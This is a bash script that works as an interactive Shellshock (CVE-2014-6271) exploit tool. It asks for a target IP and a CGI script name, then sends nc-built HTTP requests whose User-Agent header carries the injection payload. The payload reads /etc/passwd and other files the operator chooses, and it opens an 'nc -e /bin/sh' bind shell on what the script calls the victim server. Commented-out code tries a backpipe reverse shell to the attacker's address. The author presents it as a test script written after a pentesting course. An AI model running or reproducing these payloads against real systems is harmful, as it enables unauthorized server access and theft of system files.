#!/bin/bash
#
# SS-6271 - 2015 WeakNet Labs
# Douglas - Weaknetlabs@Gmail.com
#
# Version: 0.10.5
#
# ShellShock/CVE-2014-6271
#
# Late to the show, I know...
# This is a simple test script that I wrote to test some servers
#  and I wrote it after doing the Pentesterlab's course
#  https://pentesterlab.com/exercises/cve-2014-6271/course
#
# I left in the cruft for getting the mknod/backpipe method
#  the first command runs perfectly and the backpipe is
#  created, but the second command (nc) fails. Please test.
#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
GREEN='\033[0;32m' # stupid globals for colors
YELLOW='\033[0;33m' # yellow (for ALL user input/validation)
RED='\033[1;31m' # red FOR ERRORS
WHITE='\033[1;37m' # white for HTTP query notification
NC='\033[0m' # no color
ip=0; # IP address (for all functions to use)
script="none" # (script name for all functions to use)
err=0; # how many lines is a false positive? HTTP STATUS of 200 with no file contents?
port=1025 # port to bind a shell to if requested
localIP=0 # local IP address to connect back to
# Trap CTRL+C to clean up:
trap ctrl_c INT
function ctrl_c() {
	printf "$NC"; # reset terminal color
	leave 2;
}
# Begin workflow
clear # clean up screen
printf " $GREEN
  _________ _________           _________________________  ____ 
 /   _____//   _____/          /  _____/\_____  \______  \/_   |
 \_____  \ \_____  \   ______ /   __  \  /  ____/   /    / |   |
 /        \/        \ /_____/ \  |__\  \/       \  /    /  |   |
/_______  /_______  /          \_____  /\_______ \/____/   |___|
        \/        \/                 \/         \/              
$WHITE\nCVE-2014-6271/Shellshock test script\n -- Written by Douglas (Weaknetlabs@Gmail.com)$NC
[+] CTRL+C to quit\n\n";
# written with a bunch of functions
function leave { # pass me a 0 or 1 for successful exploit message, 2 for quit:
	printf "\n[+] ---------- \n";
	if [ "$1" -eq 1 ];then # to get rid of a global
		printf "[$GREEN!$NC]$GREEN Successful exploit of CVE-2014-6271 at $ip\n$NC[+] Goodbye.\n\n";
	elif [ "$1" -eq 2 ];then # CTRL+C
		printf "[$RED+$NC] Quit. GoodBye.\n";
	else
		printf "[$RED+$NC] Could not exploit host $ip's $script CGI SCRIPT.\n";
	fi
	exit;
}

function bindShell { # actually binds the shell:
	# This cruft is left here on purpose, I can;t seem to get the mknod/backpipe method working!
	#
	#printf "[+] Starting listener on port$YELLOW $port $NC ... ";
	#set -m # we will be controlling the jobs here
	#gnome-terminal -e "bash -c \"nc -nlvvvp $port;exec bash\"" &
	#printf "\n";
	#echo -e "HEAD /cgi-bin/$script HTTP/1.1\r\nUser-Agent: () { :;}; /bin/mknod /tmp/backpipe p\r\nHost: $ip\r\nConnection: close\r\n\r\n" | nc $ip 80 >/dev/null
	#echo -e "HEAD /cgi-bin/$script HTTP/1.1\r\nUser-Agent: () { :;}; /bin/sh 0</tmp/backpipe | nc $localIP $port 1>/tmp/backpipe &\r\nHost: $ip\r\nConnection: close\r\n\r\n" | nc $ip 80 >/dev/null
	# e.g: /bin/sh 0</tmp/backpipe | nc 192.168.62.10 80 1>/tmp/backpipe &' bash -c 'echo hello'
	#printf "[+] A new window opened and is awaiting pwnage!\n";
	echo -e "HEAD /cgi-bin/$script HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc -l -p $port -e /bin/sh\r\nHost: $ip\r\nConnection: close\r\n\r\n" | nc $ip 80 &
	echo "[+] Opening new terminal window ...";
	gnome-terminal -e "bash -c \"printf '$GREEN'&& printf 'Spawned shell on victim server$WHITE ($RED$ip$WHITE)$NC\nType commands below:\n$WHITE----------------------\n> ' && nc $ip $port;exec bash\""&
	leave 1;
}

function getLocalIP { # Just get the local IP address:
	# I used the mknod to be safest
	printf "[?] What IP shall the victim connect to (e.g. your IP)? $YELLOW"
	read localIP
	printf "$NC[?] Is$YELLOW $localIP$NC correct [y/n]? $YELLOW"
	read ans;
	printf "$NC"; # reset the color
	if [ "$ans" = "y" ];then
		# go for it
		bindShell # finally!
	else
		getLocalIP
	fi
}

function getShellPort { # these are broken up so that I can confirm after the user inputs the value:
	printf "[+] Before answering the next question, it is recommended\n"
	printf "    to do a port scan of the target system.\n\n"
	printf "[?] What port shall we use to bind our shell to [1024-65535]? $YELLOW"
	read port;
	printf "$NC[?] Is$YELLOW $port$NC correct [y/n]? $YELLOW"
	read ans;
	printf "$NC"; # reset terminal color
	if [ "$ans" = "y" ];then
	#	getLocalIP
		bindShell
	else
		getShellPort
	fi
}

function getShell { # shall we start a simple bind shell on the server?
	printf "[+] ---------- \n";
	printf "[?] Would you like to attempt a bind shell to the server [y/n]? $YELLOW"
	read ans;
	printf "$NC"; # reset terminal color
	if [ "$ans" = "y" ];then
		getShellPort
	else
		leave 1;
	fi
}

function getFile { # there was a success with /etc/passwd, offer more file names
	printf "[+] ---------- \n";
	printf "[?] Would you like to try another file perhaps [y/n]? $YELLOW"
	read file
	printf "$NC"; # reset terminal color
	if [ "$file" = "y" ];then
		printf "[?] Provide the file name to read: $YELLOW"
		read file;
		printf "$NC"; # reset terminal color
	else
		getShell
	fi
	response="$(echo -e "HEAD /cgi-bin/$script HTTP/1.1\r\nUser-Agent: () { :;}; echo \$(<$file)\r\nHost: $ip\r\nConnection: close\r\n\r\n" | nc $ip 80)"
	if [[ "${response}" =~ "Internal Server Error" ]];then  # HTTP/1.1 500 Internal Server Error
		printf "[$RED+$NC]$RED The file $file could not be read or contained unreadable/large data.$NC\n";
	else
		if [ "$(echo $response|wc -c)" -le "$err" ]; then # we have a false positive:
			# something
			printf "[$RED+$NC]$RED Reading $file returned a false positive, this could be a permission error.$NC\n";
		else
			printf "[$GREEN!$NC]$GREEN The file $file was successfully read!$NC\n";
			printf "[+] The full HTTP response:\n\n";
			printf "$GREEN $response $NC\n\n";
		fi
	fi
	getFile # call again
}

function getStats {
	printf "[$WHITE+$NC]$WHITE Gathering statistical information to avoid false positives ...$NC\n";
	response="$(echo -e "HEAD /cgi-bin/$script HTTP/1.1\r\nUser-Agent: () { :;}; echo \$(</etc/passwd_FOOB_BAR_BAZ_BAR_BAZ_FOO)\r\nHost: $ip\r\nConnection: close\r\n\r\n" | nc $ip 80)" # it's probably safe to say that that file should not exist. anywhere. ever.
	err=$(echo $response|wc -c);
	printf "[$GREEN!$NC]$GREEN Completed with length of $err bytes$NC\n";
}

function getPasswd { # initial test for /etc/passwd: (not part of getFile() for that reason)
	printf "[$WHITE+$NC]$WHITE Trying $ip for /etc/passwd ...$NC\n"
	response="$(echo -e "HEAD /cgi-bin/$script HTTP/1.1\r\nUser-Agent: () { :;}; echo \$(</etc/passwd)\r\nHost: $ip\r\nConnection: close\r\n\r\n" | nc $ip 80)"
	if [[ "${response}" =~ "root: x:" ]]; then
		printf "[$GREEN!$NC]$GREEN CGI script vulnerable$NC!\n"
		success=1 # we have a success!
	elif [[ "${response}" = "" ]];then
		printf "[$RED!$NC] Could not reach host $ip\n";
		leave 0;
	else
		printf "[+] CGI script may not be vulnerable\n\n";
	fi
	printf "[+] The full HTTP response:\n\n"
	printf "$GREEN $response $NC\n";
	getStats # get the length of the response
	if [ "$success" -eq 1 ];then
		getFile
	fi
}

function getScript { # get the script name in cgi-bin to attack (it's a global)
	printf "[?] What script name would you like to attack\n     (e.g. http://$ip/cgi-bin/<script name>)? $YELLOW"
	read script
	printf "$NC[?] Is$YELLOW $script$NC correct? [y/n]? $YELLOW"
	read ans
	printf "$NC"; # reset terminal color
	if [ "$ans" = "y" ];then
		getPasswd
	else
		getScript
	fi
}

function getIP { # get the IP address of the victim
	printf "[?] What is the target IP address? $YELLOW"
	read ip
	printf "$NC[?] Is$YELLOW $ip$NC correct [y/n]? $YELLOW"
	read ans
	printf "$NC";
	if [ "$ans" = "y" ]; then
		getScript
	else
		getIP # They had a typo
	fi
}

getIP
